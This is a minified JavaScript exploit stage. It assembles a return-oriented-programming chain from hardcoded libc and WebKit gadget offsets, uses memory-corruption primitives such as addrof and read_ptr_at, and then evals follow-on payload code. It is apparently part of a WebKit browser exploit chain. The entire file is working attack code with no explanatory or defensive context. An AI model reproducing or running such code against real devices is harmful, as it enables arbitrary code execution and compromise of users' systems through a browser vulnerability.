var ropchain_array=new Uint32Array(108),ropchain=read_ptr_at(addrof(ropchain_array)+16),ropchain_offset=2;function set_gadget(a){ropchain_array[ropchain_offset++]=0|a,ropchain_array[ropchain_offset++]=0|a/4294967296}function set_gadgets(a){for(var b=0;b<a.length;b++)set_gadget(a[b])}function db(a){for(var b=0;b<a.length;b++)ropchain_array[ropchain_offset++]=a[b]}var ropchain1=read_ptr_at(addrof(ropbuf)+16),ropchain1_end=ropchain1+ropbuf.buffer.byteLength,consts_arr=new Uint32Array(2*ropconsts.length);eval.call(window,js_pre);for(var val,i=0;i<ropconsts.length;i++)val=function(){var ropchain=ropchain1;return eval(ropconsts[i])}(),consts_arr[2*i]=val,consts_arr[2*i+1]=(val-val%4294967296)/4294967296;var consts_start=read_ptr_at(addrof(consts_arr)+16);ropchain_offset=2,set_gadgets([libc_base+757614,ropchain+408,libc_base+532458,libc_base+155394,ropchain1,libc_base+757614,ropchain1_end,webkit_base+21328810,libc_base+201468,libc_base+227029,webkit_base+4571187,libc_base+757614,ropchain+304,webkit_base+24344226,libc_base+362222,ropchain+136,webkit_base+15977550,libc_base+766440]),db([0,0]),set_gadgets([ropchain+176,ropchain+400,libc_base+226017,webkit_base+4571187,libc_base+757614,consts_start+144,webkit_base+24344226,libc_base+362222,ropchain+264,webkit_base+15977550,libc_base+362222]),db([8,0]),set_gadgets([webkit_base+12671175,libc_base+226017,libc_base+757614]),db([0,0]),set_gadgets([libc_base+753071,webkit_base+12671175,libc_base+757614,ropchain+40,libc_base+532458,libc_base+155394,ropchain1,libc_base+424119,webkit_base+12671175,libc_base+757614,ropchain+336,libc_base+532458,libc_base+766440,ropchain+32,libc_base+155394]),db([0,0]),set_gadgets([libc_base+766440,ropchain1]),eval.call(window,js_code),0;